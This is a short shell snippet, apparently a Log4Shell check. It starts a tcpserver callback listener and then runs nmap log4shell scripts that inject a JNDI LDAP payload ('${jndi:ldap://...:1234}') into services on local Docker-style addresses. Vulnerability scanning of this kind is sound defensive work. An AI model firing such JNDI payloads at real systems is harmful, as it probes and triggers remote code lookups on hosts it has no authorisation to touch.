tcpserver -v -1 0.0.0.0 1234 sh -c "echo 'Vulnerable machine'" 2> vulnerable.txt

nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://172.17.0.1:1234}"' -T4 -n -p8080-8081 -sV --script-timeout=1m 172.17.0.2-3